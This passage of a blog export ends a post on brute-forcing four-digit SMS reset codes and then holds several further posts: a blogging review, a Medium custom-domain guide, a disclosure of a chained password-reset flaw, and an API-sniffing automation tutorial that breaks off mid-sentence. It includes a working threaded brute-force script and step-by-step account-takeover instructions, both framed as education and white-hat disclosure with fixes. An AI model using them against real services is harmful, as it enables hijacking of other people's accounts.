combinations = 10,000 requestsTime required to crack: ((10,000 * 0.1) / number of threads) secondsEven without opening a thread, it only takes about 16 minutes to try the correct SMS verification code. Besides insufficient password length and complexity, there is also the issue of no attempt limit and overly long validity period for verification codes.CombinationIn summary, this security issue is common on the app side. Web services usually add CAPTCHA verification after multiple failed attempts or require additional security questions when requesting password resets, increasing the difficulty of sending verification requests. Additionally, if web services do not separate front-end and back-end, each verification request requires loading the entire webpage, lengthening the response time.On the app side, password reset processes are often simplified for user convenience, and some apps even allow login through phone number verification; if there is no protection on the API side, this can lead to security vulnerabilities.Practice ‚ö†Ô∏èWarning‚ö†Ô∏è This article is for demonstrating the severity of this security issue only. Do not use it for malicious purposes.Sniffing Authentication Request APIEverything starts with sniffing. For this part, you can refer to the previous articles ‚ÄúAPP uses HTTPS transmission, but data is still stolen.‚Äù and ‚ÄúUsing Python + Google Cloud Platform + Line Bot to automate routine tasks‚Äù. The first article explains the principle, and it is recommended to use Proxyman from the second article for sniffing.For websites with separated front-end and back-end, you can also use Chrome -&gt; Inspect -&gt; Network -&gt; to see what requests are sent after submitting the verification code.Assuming the received verification code request is:POST https://zhgchg.li/findPWDResponse:{ \"status\":false \"msg\":\"Verification error\"}Writing a Brute Force Python Scriptcrack.py:import randomimport requestsimport jsonimport threadingphone = \"0911111111\"found = Falsedef crack(start, end): global found for code in range(start, end): if found: break stringCode = str(code).zfill(4) data = { \"phone\" : phone, \"code\": stringCode } headers = {} try: request = requests.post('https://zhgchg.li/findPWD', data = data, headers = headers) result = json.loads(request.content) if result[\"status\"] == True: print(\"Code is:\" + stringCode) found = True break else: print(\"Code \" + stringCode + \" is wrong.\") except Exception as e: print(\"Code \"+ stringCode +\" exception error \\(\" + str(e) + \")\")def main(): codeGroups = [ [0,1000],[1000,2000],[2000,3000],[3000,4000],[4000,5000], [5000,6000],[6000,7000],[7000,8000],[8000,9000],[9000,10000] ] for codeGroup in codeGroups: t = threading.Thread(target = crack, args = (codeGroup[0],codeGroup[1],)) t.start()main()After running the script, we get:Verification code equals: 1743Enter 1743 to reset the password, replace the original password, or log in directly. Bigo!Solution Password reset with additional information verification (e.g., birthdate, security questions) Increase the verification code length (e.g., Apple‚Äôs 6-digit code) and increase the verification code complexity (if it does not affect the AutoFill function) Invalidate the verification code after more than 3 failed attempts, requiring the user to request a new code. Verification Code Expiration Time Shortened Lock device after too many failed verification attempts, add CAPTCHA verification APP should implement more SSL Pinning and transmission encryption/decryption (to prevent sniffing) Further Reading Revealing a Clever Website Vulnerability Discovered a Few Years Ago How to Create an Engaging Engineering CTF Competition The app uses HTTPS for transmission, but data was still stolen. Automate Routine Tasks with Python + Google Cloud Platform + Line Bot If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Medium Growth ReviewÔΩúBoost Your Blog Impact with Proven Strategies", "url": "/posts/zrealm-life/medium-growth-review-boost-your-blog-impact-with-proven-strategies-5ea3311119d8/", "categories": "ZRealm Life.", "tags": "english, ai-translation, life, medium, blog, ios, taiwan", "date": "2021-02-24 20:59:41 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Bye Bye 2020 Review of Running Medium in the Second YearLate, Later, and Lates...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Bye Bye 2020 Review of Running Medium in the Second YearLate, Later, and Latest: The 2020 ReviewImage from the 2020 iOS Developer service unit ‚Äî StreetVoice ‚Äî Simple Life Festival official poster 2018‚Äì2019 First Year Review is here.A Difficult YearUnrelated to work, 2020 was a tough year for me; I went through many major setbacks, but fortunately, I got through them all.I just want to say one thing: People need to learn to cherish the present and appreciate what they have.WorkBack to work, in 2020 I stepped out of my comfort zone into a new environment; this exposed me to many new experiences and allowed me to absorb a lot of valuable knowledge in iOS and engineering development. Although the number of articles I wrote in 2020 was less than before, and I even stopped updating for three to four months, I focused on quality over quantity. The fewer articles I wrote in 2020 actually performed better than previous ones; I am gradually improving!Additionally, last year I created a personal website using Google Sites and continuously sync new Medium articles there.zhgchg.liOriginal IntentionI am still myself‚ÄîI am a lazy person; I don‚Äôt write articles just for the sake of writing. Each article is based on some insights I have developed and then immediately recorded. If I get lazy and don‚Äôt do it all at once, I probably won‚Äôt bother going back to write it later (though this usually happens only with unimportant or uninteresting topics).The downside is that sometimes I get too eager and write too fast. Typos are minor, but if the content is wrong or incomplete and misleads readers, that‚Äôs truly a sin. Orz; so this year, when writing articles, I will research and address all the issues I can think of and handle, even if they weren‚Äôt used in the original project. If something can‚Äôt be resolved, I‚Äôll leave a note to remind readers to pay attention to that aspect.Chrome Extensions Used for Writing Articles Recommend again Code Medium This lets you directly use Gist to embed beautiful code within Medium!After installation, click the ‚Äú+‚Äù on Medium, then select the last option ‚Äú&lt;&gt;‚ÄùAt this point, the screen will split into left and right sections, allowing you to enter code directly on the right side:After submission, it will be directly embedded as a gist in the Medium article:The advantage of using gist to embed code is that it supports syntax highlighting, making it easier for readers to read; the downside is that when converting Medium articles to markdown format, the embedded code cannot be automatically converted and must be manually copied and pasted. - I have tried many conversion tools, but none support gist extraction. If anyone knows, please kindly share. - Medium‚Äôs built-in code blocks still do not support syntax highlighting, so this is the best we can do. Medium Next Generation Stats: Enhanced Medium backend statistics displayDaily traffic aggregation display lets you see today‚Äôs traffic article composition at a glance.There are also features for tracking new followers, claps, and more.Goals for This YearBackup PlanBesides continuing to write, I plan to find time to convert each article into Markdown format and upload them to Github for backup, in case Medium suddenly crashes one day‚Ä¶ Currently, I am using the Typora editor; it‚Äôs quite user-friendly. I‚Äôll introduce it later!TyporaThe current progress is about 15%. Feeling a bit lazy because it‚Äôs boring, haha. The official Medium backup download only saves plain text; images remain externally linked and are not downloaded. Moreover, code sections are embedded and cannot be directly displayed in Markdown.Independent DomainIt has been deployed. Please refer to ‚ÄúMedium Custom Domain Feature Returns‚Äù. Profile page: blog.zhgchg.li (I only use the subdomain blog.zhgchg.li because the main domain serves other purposes)However, I found it affects Google SEO, so I am still considering and testing whether to actually use it.Buy Me A Coffee!Recently, the following services have also been launched: üç∫ Buy me a beer on PayPal Appreciate Citizens Anyway, I have a lot of free time.StatisticsFinally, let‚Äôs do some statistics!In 2020, a total of:16 articles were published: 3 lifestyle + 2 unboxing + 11 technical articlesTotal site accumulation until 2021/02/24: Total article views: 180,000 (2x growth) Total article claps: 11,000 times (100% growth) Followers: Surpassed 400 (100% growth) Articles with Better Performance Include: iOS UIViewController Transition Basics iOS Reverse Engineering First Experience iOS 14 Clipboard Data Theft Panic: The Dilemma Between Privacy and Convenience Apple Watch Series 6 Unboxing &amp; Two-Year Usage Experience Create a ‚ÄúFake‚Äù Transparent Perspective iPhone Wallpaper Easily Thank you all for your support and love in 2020. I will continue to work hard this year as well! Your feedback is the driving force behind my writing!ZhgChgLi, 2021/02/24.If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Medium Custom Domain Feature ReturnsÔΩúBoost Your Domain Authority with Ease", "url": "/posts/zrealm-life/medium-custom-domain-feature-returns-boost-your-domain-authority-with-ease-d9a95d4224ea/", "categories": "ZRealm Life.", "tags": "medium, ÁîüÊ¥ª, domain-names, domain-authority, domain-registration, english, ai-translation", "date": "2021-02-24 02:25:15 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Medium Custom Domain Feature ReturnsBuild Your Own Domain Authority![2024/07/2...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Medium Custom Domain Feature ReturnsBuild Your Own Domain Authority![2024/07/28] Feature ReturnsSetting up a custom domain for your profile or publicationThis feature has had a bumpy history: it was first launched in 2012, then closed; reopened in 2021, announced closed again in 2022; and now in 2024, it‚Äôs back. The official documentation has been updated with complete setup steps. You can refer to the latest official guide for configuration, and also check this article for domain registration instructions: Á∂≤ÂüüË®ªÂÜäÊµÅÁ®ãÊïôÂ≠∏ÂÜçÂèÉËÄÉÊú¨ÊñáÂÖßÂÆπ. Setting up a custom domain for your profile or publication Everyone should set it up quickly while it‚Äôs open, as the official team might close it again someday; already set custom domains will not be affected. I set up https://blog.zhgchg.li back in 2021. Although the official custom domain feature was disabled in between, it still works and has been functioning properly until now.Breaking News!Custom domains are back!The official Medium blog announced on 2021/02/17 that Medium now allows creators to link their own custom domains again! Both creator Profile pages and Publications support this feature.What is a ‚ÄúCustom Domain‚ÄùTo ensure readers who are not from the IT field can understand, here is a brief explanation of what a custom domain is.Domain is like an address in the online world. When I enter the address Medium.com, it takes me to Medium. Now creators can customize their domain, meaning they can register their desired address and link it to their Medium account to replace the original address. For example, I use blog.zhgchg.li as my address, which also directs to my Medium.HistoryResearch shows that this feature was available around 2012, with a one-time setup fee of $75. However, by the time I started writing on Medium (2018), the service had already been discontinued. Those who had applied before were unaffected, so sometimes when browsing Medium, you‚Äôd see a custom domain but the site is still Medium‚Äîpretty cool. I heard it was removed shortly after launch, and I guess it was for business reasons since custom domains reduce Medium‚Äôs brand recognition.Benefits Recognition: Custom domains offer many benefits to creators, the most direct being recognition. Instead of a medium.com/@xxxx URL, it shows your own name, e.g., zhgchg.li/ Flexibility: If you decide to leave Medium for your own website later, you can redirect the original links straight to the new site. Domain Authority: Related to SEO rankings, you can build your domain authority through Medium, so you won‚Äôt have to start SEO from zero when moving to other platforms in the future. Cons No longer enjoying the high Domain Authority SEO ranking advantage of medium.com, which may seriously affect search traffic initially.RulesI found that article links and share links will revert to the default medium.com URL if the article is added to a Publication that does not have a Custom domain set, nor does it use the Profile‚Äôs Domain.My SetupHere is one of my settings for your reference. Profile page: blog.zhgchg.li (I only use the subdomain blog.zhgchg.li because the main domain serves other purposes) I originally set up a Publication page but later removed it because I don‚Äôt have many followers and rely heavily on traffic from search engines like Google. If the Publication page also uses a Custom Domain, the article links will use my domain, which is still new and ranks very low in search results, failing to attract traffic. Setting only the Profile without a Publication has one advantage: the original Medium link can still be indexed by Google. Additionally, you can create another link using your own domain, achieving the best of both worlds; you won‚Äôt lose your original traffic while gradually building your domain‚Äôs Domain Authority.Suitable AudienceBuilding Domain Authority from scratch requires a long period of accumulation. I think this feature is best suited for those who already have a website service (e.g., musicplayer.com). If you want to build a community, you can directly use Medium, and in that case, the domain can be used as (blog.musicplayer.com). Use the Medium platform directly to write articles (and the customization features are increasing), 2. The domain itself already has DA, so it won‚Äôt affect SEO much.PricingDomain section:Purchase according to your preference from Namecheap (used as an example in this article) or Godaddy. Common .com domains cost around NT$200‚Äì500 per year; prices vary based on domain extensions and length, with rare ones sometimes costing millions or even billions.Domain registration follows a first-come, first-served policy. Unless the domain name has trademark protection in that region, it can only be reclaimed through legal means; otherwise, whoever registers it first wins. You would have to negotiate a purchase with them. This has led to a type of investment (domain squatting) where people register many domains and hold them without use, waiting for others to buy them.Domains require annual payment or can be purchased for multiple years at once; there is no lifetime ownership. If not renewed, the domain will be released after the grace period, allowing anyone to register it again.However, friends who want to manage Medium probably won‚Äôt encounter domain squatting issues, as most users are individuals. I registered using my online account zhgchg.li, which no one else had registered before. If by chance there is a duplicate, you can also change the suffix, such as .div, .net, etc.The suffixes can refer to the List of Internet Top-Level Domains, but not all listed are available for registration; it depends on the regulations of the domain‚Äôs country. Also, reseller platforms (such as Namecheap, GoDaddy, etc.) may not offer domains with certain suffixes.For example, my .li domain is from Liechtenstein. Currently, there are no identity requirements for registrants; anyone or any company can register. Also, only Namecheap still sells it.What are the advantages of having the surname Li? By the way, my domain spelling zhgchg.li is a type of Domain Hack; a better example is google =&gt; goo.gl.Medium section:The one-time $75 setup fee has been removed, and now all Medium paid members can use this feature ( $5/month or $50/year ); but I actually preferred the original one-time fee QQ; since I‚Äôm mostly a creator, I don‚Äôt really need the paid membership perks, so the monthly or yearly fee is more painful for me, and I‚Äôm starting to consider joining the paywall plan Orz.2021/04/05 UpdateWhat happens if you join the membership plan first, set up a custom domain, and then stop renewing the membership? Tested: Custom domain remains valid after membership expires!Getting Started ‚≠êÔ∏è‚≠êÔ∏è‚≠êÔ∏è The purchased domain can also be used with: Github Pages For example, my domain: 1. https://zhgchg.li -&gt; Used for Github Pages Jekyll Blog 2. https://blog.zhgchg.li -&gt; Used on my Medium page1. Purchase &amp; Obtain a Domain Name (Using Namecheap as an example)First, go to the Namecheap homepage and search for your preferred domain name:Get search results:The button on the right showing ‚ÄúAdd To Cart‚Äù means the domain is still available and can be added to the cart for purchase.If the button on the right shows ‚ÄúMake offer‚Äù or ‚ÄúTaken,‚Äù it means the domain is already registered. Please choose a different extension or try another domain name:After adding to the cart, click the ‚ÄúCheckout‚Äù button below.Go to the order confirmation page: Domain Registration: Here you can choose AUTO-RENEW for automatic annual renewal, or select a one-time purchase for multiple years. WhoisGuard: Since domain information is publicly accessible to anyone (registration date, expiration date, registrant, contact details), this feature replaces your personal registrant and contact info with Namecheap‚Äôs, preventing spam messages.(This feature may cost extra for some domain extensions; if it‚Äôs free, use it!) Here is some WHOIS information for google.com, which you can check here. PremiumDNS: We know a domain name is like an address plate, meaning people look at it to find the location; this feature provides a more stable and secure ‚Äúlocation finding‚Äù function. I think it‚Äôs unnecessary unless it‚Äôs a high-traffic e-commerce site where no errors are allowed.Enter your credit card information and click ‚ÄúConfirm Order‚ÄùThen the purchase is successful!You will receive an order confirmation email.2. Setting up the Domain (Using Namecheap as an example)After logging in, click your account at the top left -&gt; ‚ÄúDashboard‚ÄùAfter entering the Dashboard, switch to the Domain List tab, find the domain you just purchased, and click Manage.After entering, switch to the last tab labeled ‚ÄúAdvanced DNS‚ÄùKeep it on this page for now, then return to Medium.Go to Medium‚Äôs Settings page, find the ‚ÄúCustom domain‚Äù section under the ‚ÄúProfile‚Äù block, and click ‚ÄúGet started‚Äù. For Publications, please go to the Publications‚Äô ‚ÄúHomepage and settings,‚Äù then find the ‚ÄúCustom domain‚Äù section at the bottom.If it shows ‚ÄúUpgrade,‚Äù it means you need to upgrade to a paid user before using this feature.Enter the settings page:Enter your domain name, e.g., www.example.comRemember the above information, then return to the Namecheap settings page.Find the HOST RECORDS section under the Advanced DNS tabClick the ‚ÄúADD NEW RECORD‚Äù button below twice to display two new entry fields.Input the information from Medium: Choose ‚ÄúA Record‚Äù If you are using the main domain (e.g., zhgchg.li), enter www. If you are using a subdomain like me, enter the subdomain name. Enter the IP information as on Medium Then click the ‚Äú‚úî‚Äù on the right to complete the addition.Check the ‚ÄúHOST RECORDS‚Äù section again for any existing records.If everything is set up on Namecheap, go back to the Medium settings page.Click ‚ÄúContinue‚Äù to proceed.If you see the processing page, it means the setup is complete!Here, I want to explain that domain binding and DNS settings may take up to 48 hours to fully take effect. It might not be instant. In my experience, it succeeded within 15 minutes; however, within those 48 hours, you might be able to access it while others cannot.Visiting the domain before activation will show a 404 error:Things to NoteLinks shared using a custom domain may become invalid if the custom domain is changed later.Small Issues2021/02/24 When I wrote this, the feature was still new and had some issues that Medium needed to resolve:Custom domains are back!But I think it can already operate 99% normally!What if the paid membership is canceled‚Ä¶ will it immediately become invalid?Further Reading Github Pages Custom Domain TutorialIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Website Security Flaws ExposedÔΩúHow Combined Vulnerabilities Compromise Protection", "url": "/posts/zrealm-dev/website-security-flaws-exposed-how-combined-vulnerabilities-compromise-protection-142244e5f07a/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, hacker, web-security, website-security-test, capture-the-flag", "date": "2021-02-22 21:27:06 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Revealing a Clever Website Vulnerability Discovered Years AgoWebsite Security ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Revealing a Clever Website Vulnerability Discovered Years AgoWebsite Security Issues Caused by Multiple Combined VulnerabilitiesPhoto by Tarik HaigaIntroductionA few years ago, while still supporting web development, I was assigned to organize a CTF competition for the company‚Äôs internal engineering team. Initially, the plan was to divide teams based on company products for offense and defense challenges. However, as the organizer, I first conducted penetration tests on the company‚Äôs products to assess the security level. I wanted to see how many vulnerabilities I could find to ensure the event would run smoothly. However, due to limited competition time and significant differences in engineering fields, the final questions focused on common engineering fundamentals and interesting topics. Interested readers can refer to my previous article ‚ÄúHow to Create a Fun Engineering CTF Competition,‚Äù which contains many creative challenges!Found VulnerabilitiesA total of four vulnerabilities were found across three products. In addition to the issues discussed in this article, I also discovered the following three common website vulnerabilities: Never Trust The Client!The problem is basic: the frontend sends the ID directly to the backend, and the backend accepts it without verification. This should be changed to validate a Token instead. Password Reset Design FlawI actually forgot the details, only remember there was a programming flaw; it allowed bypassing email verification during the password reset process. XSS Issue Vulnerabilities Introduced in This Article All searches are conducted as black-box testing. The only product in which I found XSS issues is one I participated in developing; for the others, I neither participated nor have seen the code.Current Vulnerability StatusAs a white-hat hacker, all identified issues were reported to the engineering team and fixed immediately; now, two years have passed, and it‚Äôs time to disclose them. However, out of respect for my former company, this article will not mention which product had the vulnerability. Please just refer to the discovery process and causes of this vulnerability!Consequences of the VulnerabilityThis vulnerability allows attackers to change the target user‚Äôs password at will and log in to the target account with the new password, stealing personal information and conducting illegal activities.Main Cause of the VulnerabilityAs stated in the title, this vulnerability is triggered by a combination of multiple factors, including the following: Account login does not support two-factor authentication or device binding Reset password verification uses serial number Website data encryption feature has a decryption vulnerability Abuse of encryption and decryption functions Token validation design error Backend does not re-verify field correctness User email addresses on the platform are public information How to Reproduce the VulnerabilitySince user email addresses are public information on the platform, we first browse the target account on the platform; after identifying the email, we proceed to the password reset page. First, enter your email to reset your password. Enter the email of the account you want to hack, then proceed with the password reset process as usual. Both operations will send a password reset verification email.Go to your inbox and find the password reset verification email sent to you.Change the password link to the following URL format:https://zhgchg.li/resetPassword.php?auth=PvrrbQWBGDQ3LeSBBydPvrrbQWBGDQ3LeSBByd is the verification token for this password reset operation.But when I observed the captcha image on the website, I found that the captcha image link format is also similar:https://zhgchg.li/captchaImage.php?auth=6EqfSZLqDc6EqfSZLqDc displays 5136.What if we put our password reset token in? Who cares! Let‚Äôs try it! Bingo!But the captcha image is too small to get complete information.Let‚Äôs continue to find usable points‚Ä¶The website, to prevent crawler interference, displays users‚Äô public email addresses as images, keyword: images! images! images!Open it right away and take a look:Personal Profile PageWebpage Source Code SectionWe also obtained similar URL format results:https://zhgchg.li/mailImage.php?mail=V3sDblZgDGdUOOBlBjpRblMTDGwMbwFmUT10bFN6DDlVbAVtV3sDblZgDGdUOOBlBjpRblMTDGwMbwFmUT10bFN6DDlVbAVt displays zhgchgli@gmail.comJust ignore it! Fill it up! Bingo!ü•≥ü•≥ü•≥ PvrrbQWBGDQ3LeSBByd = 2395656After reverse engineering the password reset token, it was found to be numericI thought it might be a serial number‚Ä¶So I entered the email again to request a password reset, extracted the Token from the new email, and got 2395657 ‚Ä¶ what the fxck‚Ä¶ it really is.Once you know it‚Äôs a sequential process, handling it becomes easier. That‚Äôs why the initial step is to request a password reset email for your own account first, then request it for the target account; this is because you can already predict the ID for the next password reset request. Next, you just need to find a way to convert 2395657 back into a Token!What a coincidence, I found another issue The website only validates the email format on the frontend during data editing; the backend does not re-validate the format for correctness‚Ä¶After bypassing the front-end validation, change the email to the next target. Fire in the hole!We get:https://zhgchg.li/mailImage.php?mail=UTVRZwZuDjMNPLZhBGIAt this point, reset the password token and return to the password reset page: Successful intrusion! Bypassed verification to reset someone else‚Äôs password!Finally, because there was no two-factor authentication or device binding feature, once the password was overwritten, the account could be accessed and impersonated directly.The CauseReorganize the entire process. At the beginning, we needed to reset the password but found that the reset password token was actually a serial number, not a truly unique identifier token. The website abuses encryption and decryption functions without distinguishing their uses; almost the entire site uses the same set. The website has an online encryption and decryption portal (equivalent to key compromise). Backend does not re-verify user input No two-factor authentication or device binding features Fix Method The fundamental point is that the password reset token should be a randomly generated unique identifier token. For website encryption and decryption, different keys should be used based on the function. Prevent external parties from arbitrarily manipulating data encryption and decryption. The backend should validate user input. Enable two-factor authentication and device binding for added security just in case. SummaryThe entire process of discovering the vulnerability surprised me because many were basic design issues. Although the features seemed functional and the small flaws appeared relatively safe on their own, combining multiple holes created a major vulnerability. Developers really need to be careful and cautious.Further Reading How to Create an Engaging Engineering CTF Competition The app uses HTTPS for transmission, but data was still stolen Security Issues of SMS Verification Code Strength in Password Recovery If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Automate Routine Tasks with Python, Google Cloud Platform & Line BotÔΩúDaily Check-In Script Example", "url": "/posts/zrealm-dev/automate-routine-tasks-with-python-google-cloud-platform-line-bot-daily-check-in-script-example-70a1409b149a/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, google-cloud-platform, cloud-functions, cloud-scheduler, ios-app-development, python", "date": "2021-02-20 19:55:51 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Automate Routine Tasks Using Python + Google Cloud Platform + Line BotUsing a ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Automate Routine Tasks Using Python + Google Cloud Platform + Line BotUsing a Check-in Reward App as an Example to Create a Daily Auto Check-in ScriptPhoto by Pawe≈Ç Czerwi≈ÑskiOriginI have always used Python for small tools; some are serious, like automating data scraping and report generation at work, while others are casual, such as scheduling automatic information retrieval or letting scripts perform tasks that were originally done manually.I have always handled ‚Äúautomation‚Äù in a straightforward way by running a Python script on a dedicated computer. The advantage is simplicity and convenience, but the downside is needing a device connected to the internet and power. Even a Raspberry Pi consumes a small amount of electricity and internet data. Also, remote control to start or stop the script is difficult (actually possible, but complicated). This time, during a work break, I explored free and cloud-based methods.Goal Move Python scripts to the cloud for execution, schedule automatic runs, and enable remote on/off control via the internet. This article uses a clever trick I devised to create an automated check-in script for reward-based check-in apps, enabling daily automatic check-ins without manually opening the app; it also sends me a notification upon completion.Notification complete!Chapter Order of This Article Using Proxyman for Man-in-the-Middle Attack API Sniffing Write a Python script to spoof APP API requests (simulate check-in actions) Moving a Python Script to Google Cloud Setting Up Automatic Scheduling in Google Cloud Due to the sensitive nature, this article will not reveal which check-in reward app is involved. Readers can explore and use similar apps on their own. If you only want to learn how to automate with Python, you can skip the first half about Man in the Middle attack API sniffing and start from Chapter 3. Tools Used Proxyman: Man-in-the-middle attack API sniffing Python: Writing scripts Linebot: Send script execution result notifications to yourself Google Cloud Function: Python script hosting service Google Cloud Scheduler: Automated scheduling service 1. Using Proxyman for Man in the Middle Attack API SniffingPreviously, I published an article titled ‚ÄúThe APP uses HTTPS transmission, but the data was still stolen.‚Äù The principle is similar, but this time I used Proxyman instead of mitmproxy; both are free, but Proxyman is easier to use. Go to the official website https://proxyman.io/ to download the Proxyman tool After downloading, launch Proxyman and install the Root certificate (to perform a Man-in-the-Middle attack to decrypt HTTPS traffic). ‚ÄúCertificate‚Äù -&gt; ‚ÄúInstall Certificate On this Mac‚Äù -&gt; ‚ÄúInstalled &amp; Trusted‚ÄùAfter installing the computer‚Äôs Root certificate, switching to the phone:‚ÄúCertificate‚Äù -&gt; ‚ÄúInstall Certificate On iOS‚Äù -&gt; ‚ÄúPhysical Devices‚Ä¶‚ÄùSet up the proxy on your phone as instructed, then complete the certificate installation and activation. Open the app on your phone whose API transmission you want to sniff.At this point, Proxyman on the Mac will show the sniffed traffic. Click on the device IP and then the APP API domain you want to check; the first time you view it, you need to click ‚ÄúEnable only this domain‚Äù before the traffic can be unpacked.After enabling ‚ÄúEnable only this domain,‚Äù you can see the newly intercepted traffic with the original Request and Response information: We use this method to sniff which API endpoint the app calls during check-in and what data it sends. We record this information to later simulate the request directly using Python. ‚ö†Ô∏è Note that some APP token information may change, causing future Python simulated requests to fail. It is important to understand how APP token exchange works. ‚ö†Ô∏è If you are sure Proxyman is working properly, but the app cannot send requests while using Proxyman, it means the app may have SSL Pinning; currently, there is no solution and you have to give up. ‚ö†Ô∏èApp developers who want to learn how to prevent sniffing can refer to the previous article.Assuming the information we have is as follows:POST /usercenter HTTP/1.1Host: zhgchg.liContent-Type: application/x-www-form-urlencodedCookie: PHPSESSID=dafd27784f94904dd586d4ca19d8ae62Connection: keep-aliveAccept: */*User-Agent: (iPhone12,3;iOS 14.5)Content-Length: 1076Accept-Language: zh-twAccept-Encoding: gzip, deflate, brAuthToken: 123452. Write a Python script to forge APP API requests (simulate check-in actions) Before writing the Python script, we can use Postman to test the parameters and identify which are necessary or time-sensitive; copying them directly is also acceptable.checkIn.py:import requestsimport jsondef main(args): results = {} try: data = { \"action\" : \"checkIn\" } headers = { \"Cookie\" : \"PHPSESSID=dafd27784f94904dd586d4ca19d8ae62\", \"AuthToken\" : \"12345\", \"User-Agent\" : \"(iPhone12,3;iOS 14.5)\" } request = requests.post('https://zhgchg.li/usercenter', data = data, headers = headers) result = json.loads(request.content) if result['status_code'] == 200: return \"CheckIn Success!\" else: return result['message'] except Exception as e: return str(e) ‚ö†Ô∏è The purpose of args in main(args) will be explained later. For local testing, just use main(True).Use the Requests package to perform HTTP Requests for us. If the following occurs:ImportError: No module named requestsPlease install the package first using pip install requests.Add Execution Result Linebot Notification:This part is very simple; it is for reference only and just for notifying myself. Go to &amp; activate Line Developers Console Create a Provider Select ‚ÄúCreate a Messaging API channel‚ÄùNext, after filling in the basic information, click ‚ÄúCreate‚Äù to submit and create. After setting up, locate the ‚ÄúYour user ID‚Äù section under the first ‚ÄúBasic settings‚Äù tab. This is your User ID. After setting up, select the ‚ÄúMessaging API‚Äù tab and scan the QR code to add the bot as a friend. Scroll down to the ‚ÄúChannel access token‚Äù section and click ‚ÄúIssue‚Äù to generate the token. The copied Token allows us to send messages to users. With the User Id and Token, we can now send messages to ourselves. Since no other functions are required, there is no need to install the Python Line SDK; simply send HTTP requests directly.After connecting with the previous Python script‚Ä¶checkIn.py:import requestsimport jsondef main(args): results = {} try: data = { \"action\" : \"checkIn\" } headers = { \"Cookie\" : \"PHPSESSID=dafd27784f94904dd586d4ca19d8ae62\", \"AuthToken\" : \"12345\", \"User-Agent\" : \"(iPhone12,3;iOS 14.5)\" } request = requests.post('https://zhgchg.li/usercenter', data = data, headers = headers) result = json.loads(request.content) if result['status_code'] == 200: sendLineNotification(\"CheckIn Success!\") return \"CheckIn Success!\" else: sendLineNotification(result['message']) return result['message'] except Exception as e: sendLineNotification(str(e)) return str(e) def sendLineNotification(message): data = { \"to\" : \"Insert your User ID here\", \"messages\" : [ { \"type\" : \"text\", \"text\" : message } ] } headers = { \"Content-Type\" : \"application/json\", \"Authorization\" : \"Insert channel access token here\" } request = requests.post('https://api.line.me/v2/bot/message/push',json = data, headers = headers)Test if the notification was sent successfully:Success! A brief side note: I originally planned to use Gmail SMTP to send emails for notifications, but after moving to Google Cloud, I found it was not possible‚Ä¶3. Moving the Python Script to Google CloudThe basics have been covered, now let‚Äôs move on to the main part of this article: deploying the Python script to the cloud.At first, I considered using Google Cloud Run, but found it too complicated and didn‚Äôt want to spend time researching it since my needs 